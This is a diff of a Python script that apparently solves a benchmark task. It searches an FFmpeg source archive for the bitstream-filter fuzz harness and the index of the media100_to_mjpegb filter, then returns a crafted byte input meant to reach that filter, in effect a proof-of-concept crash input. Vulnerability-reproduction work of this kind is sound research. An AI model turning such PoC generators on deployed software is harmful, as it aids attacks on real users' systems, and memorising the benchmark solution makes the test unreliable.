@@ -1,146 +1,91 @@
 import tarfile
 import re
-import struct
 
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        DEFAULT_LEN = 1025
-        MAX_LEN = 5000
-        DEFAULT_INDEX = 0
+        with tarfile.open(src_path, "r:*") as tf:
+            fuzzer_code = self._find_bsf_fuzzer_code(tf)
+            uses_name = (
+                fuzzer_code is not None
+                and "av_bsf_get_by_name" in fuzzer_code
+                and "av_bsf_iterate" not in fuzzer_code
+            )
 
-        try:
-            tf = tarfile.open(src_path, "r:*")
-        except Exception:
-            return b"\x00" * DEFAULT_LEN
+            if uses_name:
+                header = b"media100_to_mjpegb\x00\x00"
+                payload_len = max(1, 1025 - len(header))
+                payload = b"\x00" * payload_len
+                return header + payload
 
-        members = tf.getmembers()
+            idx = self._extract_bsf_index(tf)
+            if idx is None:
+                idx = 0
+            header = idx.to_bytes(4, "little", signed=False)
+            payload_len = max(1, 1025 - len(header))
+            payload = b"\x00" * payload_len
+            return header + payload
 
-        bsf_fuzzer_content = None
-        bsf_fuzzer_score = -1
-
-        bsf_list_content = None
-        potential_list_files = []
-
-        # First pass: find BSF fuzzer and possible BSF list file
-        for m in members:
-            if not m.isfile():
+    def _find_bsf_fuzzer_code(self, tf: tarfile.TarFile):
+        for member in tf.getmembers():
+            if not member.isfile():
                 continue
-            name = m.name
-            if not (name.endswith(".c") or name.endswith(".cc") or name.endswith(".cpp")):
+            name_lower = member.name.lower()
+            if not (
+                name_lower.endswith(".c")
+                or name_lower.endswith(".cc")
+                or name_lower.endswith(".cpp")
+            ):
                 continue
-            if m.size > 2_000_000:
+            if member.size > 200000:
+                continue
+            f = tf.extractfile(member)
+            if f is None:
+                continue
+            data = f.read()
+            if b"LLVMFuzzerTestOneInput" not in data:
+                continue
+            text = data.decode("utf-8", errors="ignore")
+            lower = text.lower()
+            if ("av_bsf" in text or "avbsf" in lower or "avbitstreamfilter" in lower) and (
+                "bsf" in lower
+            ):
+                return text
+        return None
+
+    def _extract_bsf_index(self, tf: tarfile.TarFile):
+        target_symbol = "media100_to_mjpegb"
+        array_pattern = re.compile(
+            r"(?:ff_bsf_list|bitstream_filters)\s*\[\s*\]\s*=\s*{([^}]+)};",
+            re.S,
+        )
+        entry_pattern = re.compile(r"&ff_([A-Za-z0-9_]+)_bsf")
+
+        for member in tf.getmembers():
+            if not member.isfile():
+                continue
+            name_lower = member.name.lower()
+            if not name_lower.endswith(".c"):
+                continue
+            if "libavcodec" not in name_lower:
+                continue
+            f = tf.extractfile(member)
+            if f is None:
+                continue
+            data = f.read()
+            text = data.decode("utf-8", errors="ignore")
+            if "media100_to_mjpegb_bsf" not in text:
+                continue
+            m = array_pattern.search(text)
+            if not m:
+                continue
+            body = m.group(1)
+            entries = entry_pattern.findall(body)
+            if not entries:
                 continue
             try:
-                f = tf.extractfile(m)
-                if f is None:
-                    continue
-                data_bytes = f.read()
-            except Exception:
+                idx = entries.index(target_symbol)
+                return idx
+            except ValueError:
                 continue
-            try:
-                data = data_bytes.decode("utf-8", errors="ignore")
-            except Exception:
-                continue
-
-            lname = name.lower()
-
-            # Detect BSF-related fuzzer
-            if "LLVMFuzzerTestOneInput" in data:
-                if "AVBSFContext" in data or "av_bsf_" in data or "AVBitStreamFilter" in data:
-                    score = 0
-                    if "bsf" in lname or "bitstream" in lname:
-                        score += 2
-                    if "ffmpeg" in lname:
-                        score += 1
-                    if bsf_fuzzer_content is None or score > bsf_fuzzer_score:
-                        bsf_fuzzer_score = score
-                        bsf_fuzzer_content = data
-
-            # Direct hit: list file referencing media100_to_mjpegb
-            if "ff_media100_to_mjpegb_bsf" in data and "&ff_media100_to_mjpegb_bsf" in data:
-                bsf_list_content = data
-
-            # General candidate list files: many &ff_*_bsf entries
-            if "&ff_" in data and "_bsf" in data:
-                count = len(re.findall(r"&ff_[A-Za-z0-9_]+_bsf", data))
-                if count > 0:
-                    potential_list_files.append((count, data))
-
-        # Fallback: choose file with most &ff_*_bsf entries as BSF list
-        if bsf_list_content is None and potential_list_files:
-            potential_list_files.sort(key=lambda x: x[0], reverse=True)
-            bsf_list_content = potential_list_files[0][1]
-
-        # Parse BSF list to get index of media100_to_mjpegb
-        bsf_index = DEFAULT_INDEX
-        if bsf_list_content is not None:
-            content = bsf_list_content
-            stack = []
-            best_seg = None
-            best_count = 0
-            for i, ch in enumerate(content):
-                if ch == "{":
-                    stack.append(i)
-                elif ch == "}" and stack:
-                    start = stack.pop()
-                    if not stack:
-                        seg = content[start : i + 1]
-                        cnt = seg.count("_bsf")
-                        if cnt > best_count:
-                            best_count = cnt
-                            best_seg = seg
-            if best_seg is not None:
-                names = [m.group(1) for m in re.finditer(r"ff_([A-Za-z0-9_]+)_bsf", best_seg)]
-                for idx, nm in enumerate(names):
-                    if "media100_to_mjpegb" in nm:
-                        bsf_index = idx
-                        break
-
-        # Determine minimal size requirement from fuzzer code
-        min_size = 8
-        if bsf_fuzzer_content is not None:
-            sizes = []
-            for m in re.finditer(r"if\s*\(\s*size\s*<\s*(\d+)\s*\)", bsf_fuzzer_content):
-                try:
-                    sizes.append(int(m.group(1)))
-                except Exception:
-                    pass
-            for m in re.finditer(r"if\s*\(\s*size\s*<=\s*(\d+)\s*\)", bsf_fuzzer_content):
-                try:
-                    sizes.append(int(m.group(1)) + 1)
-                except Exception:
-                    pass
-            if sizes:
-                smax = max(sizes)
-                if smax + 1 > min_size:
-                    min_size = smax + 1
-
-        total_len = max(DEFAULT_LEN, min_size + 100)
-        if total_len > MAX_LEN:
-            total_len = MAX_LEN
-
-        # Determine endianness for header integers (default little-endian)
-        endian = "<"
-        if bsf_fuzzer_content is not None:
-            if "AV_RB32" in bsf_fuzzer_content and "AV_RL32" not in bsf_fuzzer_content:
-                endian = ">"
-
-        val = bsf_index & 0xFFFFFFFF
-        if endian == "<":
-            iv = struct.pack("<I", val)
-        else:
-            iv = struct.pack(">I", val)
-
-        # Use two identical 32-bit integers: one likely for decoder id, one for BSF id
-        header = iv + iv
-        if total_len < len(header) + 1:
-            total_len = len(header) + 1
-
-        rem = total_len - len(header)
-        payload = bytearray(rem)
-        for i in range(rem):
-            payload[i] = (i * 7 + 13) & 0xFF
-
-        poc = header + bytes(payload)
-        return poc
+        return None
